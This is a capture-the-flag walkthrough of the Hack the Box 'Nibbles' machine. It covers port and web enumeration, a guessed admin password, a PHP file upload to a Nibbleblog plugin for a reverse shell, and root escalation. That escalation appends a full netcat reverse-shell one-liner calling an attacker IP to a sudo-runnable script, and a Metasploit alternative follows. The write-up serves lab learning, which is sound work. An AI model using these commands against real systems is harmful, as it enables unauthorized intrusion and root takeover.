# :electric_plug: Hack the Box: Nibbles Walkthrough

---

# Hack the Box: Nibbles Walkthrough

## Port Scanning

For this box, we know it’s a Linux box and it has a web server of some kind. Let’s perform some emumeration and start off with an nmap scan.

Run the command `nmap -sV --open -oA nibbles_initial_scan <target_ip>` this will perform a full version scan on the target, only returning output for open ports and will output everything to the initial scan file.

the .nmap file is the same as stndout and the other two are formatted for potential other operations

As a side note, the -p- flag for nmap will scan ALL ports, helpful for finding more hidden services.

Next, as a good pratice to verify the nmap scans we can perform some banner grabbing with the command `nc -nv <target_ip> <target_port>`

Now after verifying that only ports 22 and 80 are open, we can utilize some nmap scripts to try and acquire some more information. We can use the default scripts by running `nmap -sC -p 22,80 -oA script_scan <target_ip>` . The -p flag just specifies the ports to save time as we dont need to hit every port with the scripts. Now point and fire.

We can also hit it with a http specific script to see if we get anything. Let’s try `nmap -sV --script=http-enum -oA http_enum_scan <target_ip>`. This http-enum script will try to find any standard or common directory paths for the web server.

## Web Enumeration

The `whatweb <target_ip>` command can be useful for identifying web app technology.

Additionally, looking at the html source or just curling the webpage we can see there’s an html comment that references a /nibbleblog/ directory. We can `whatweb` that as well or navigate to the page.

Running whatweb on the /nibbleblog directory reveals that shockingly, it is running a app called nibbleblog. Using the power of search engines we can see that there is a Nibbleblog file upload exploit and its built into Metasploit, wow 2 ez. However, we do not yet know the version of Nibbleblog this page is running so let’s do some more recon.

Using gobuster, we can try to enumerate any other file paths on the web server. `gobuster dir -u http://<target_address>/<file_path> --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt`. Bit of a mouthful, but that will attempt to enumerate any common file paths on the web server.

Our gobuster scan reveals that there is an exposed admin web page and a README file. Either going to the README in the browser or `curl` ing it will reveal some information about the app, most importantly for us though, the version number. Confirming our suspicion as 4.0.3 is the version vulnerable to our metasploit module.

Before we go down the rabbithole of trying to get that module working, maybe there’s an easier option. Let’s continue to do some enumeration and visit each of the web pages gobuster gave us results for.

After digging around the available directories we find that under /content/private there is a users.xml file. There aren’t any passwords, but we do see that admin is a valid user. In this same directory, there is a config.xml file and while it doesn’t have any passwords and doing a google search reveals no default passwords, we see the reoccuring theme of nibbles throughout the site. Could nibbles be the admin password?

Nibbles being the password really just goes to show not only the importance of enumeration, but also pattern recognition and trying all likely options.

Alright, after gaining access to the admin login page we need to find a way to turn our web portal access into a shell. We do have that Metasploit module, but let’s only use that as a fall back. Let’s explore the admin portal and see what we can find.

After perusing all the different options we come across this plugin page.

Now we also know that this is a php page and that sometimes php can be vulnerable to file upload vulnerabilities. We see this Images plugin and maybe it’s possible that allows us to upload files?

Perfect. Alright, so now here’s the deal. We’re gonna put this ````php code

into a file and we’re gonna upload it to the server and see what happens.

Okay, file is ready to go

Okay, after uploading the file we do seem to get a lot of errors, but it didn’t say that it *didn’t* upload. Maybe we can check if it uploaded by going back to that /content directory and seeing what’s in there now.

Alright so we’re here in the content directory, let’s just go through these and see what we find. Starting with private.

Is that a plugins directory I see? Could it be?

Truly?

Now at first it may seem hope is lost, but maybe there’s a chance the server renames files? I mean, it’s always important to double check. image.php

Awesome. We know what to do, let’s set up a nc listener on our host machine. Oh and also there’s this nifty php one line to get our reverse shell.

my ip is 10.10.14.38 and I’ll use port 7777

Very nice, let’s start our nc listener and then fire this bad boi off

Oh important note, either curl the file you just uploaded or visit the file via your browser, I’ll do the browser method

You’re damn right I’m the nibbler

## Get KarmicDragoon92’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Alright we have our shell, but’s it’s not pretty and makes me feel dirty. Like I hacked into this system or something. Here’s a python one liner to make our shell prettier

Alright, another quick note I wanted to make. At first it’s like oh no python isn’t installed, but no python3 is, just not 2. This is verified with both the `which` and `whereis` commands. So to get our shell (but pretty) just add the 3

Very nice. Let’s go plunder this users home directory cause why not

in nibblers home folder we see a personal zip file and a user.txt file which has our flag in there

## Privilege Escalation

Alright, the moment that separates the boys from the men. Time to gain root (or just you know, more system access). Before we start digging around for potential exploitable binaries or misconfigs in the sudoers file, let’s unzip this personal.zip file.

Here we see some definitely personal things, but also a monitoring script?

Hmmm, well it is in fact a system health monitoring script owned by our user here. Could be useful, let’s explore some other avenues.

Alright, we’re going to pull LinEnum.sh onto our server here to do some priv esc checks. Let’s first make sure we have said script and then host a python server so we can wget the script over to us.

Script acquired

And server hosting, let’s grab our script

Very very nice. Let’s make it executable and then run it

Alright, give that a second to run and then we’ll scan through the output and see what we might have

So it does look like we can execute that monitoring script with sudo privileges. Well perfect, what we can do is add a reverse shell one liner to the end of that file then and run it.

```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.38 8888 >/tmp/f' | tee -a monitor.sh
```

IMPORTANT note from HTB. During pentests, it is important to make backups of these files before modifying them as we don’t want to disrupt the business’s operations.

Okay, let’s start the root reverse shell in a new shell and then append our rev shell to the file

Lol you can see me struggling to get it to fire correctly for a second. But yeah no after appending that line to the end of our users monitor.sh file we get a root shell on our other nc listener.

Annnndddddd roooottteedddd.

As mentioned earlier, there is an alternative pathway here where we use the Metasploit module in order to achieve the same goal. Metasploit is a great back up option for when we need it, but should not really be our go to as it doesn’t teach us very much and the whole point of doing these boxes is to learn new tools and techniques.

As you can see here from searchsploit though, yes we do have a module for Nibbleblog v 4.0.3. So let’s fire up Metasploit and try out this module.

Here we search for the nibbleblog exploit again, find it and load it by just typing use 0.

show options shows us all of the different setting that can be set for this module. For some exploit there are required settings, indicated by the yes under the Required section. So we need to set the PASSWORD, RHOSTS, TARGETURI, USERNAME and LHOST options so let’s do all that.

Doing show options again after all of that should reflect the correct settings for each field

We also need to change the payload to generic/shell_reverse_tcp which, as it says, it just a generic reverse shell. After running `set payload generic/shell_reverse_tcp` we can go ahead and exploit

From this point we can do the same privilege escalation steps in order to root the box

---
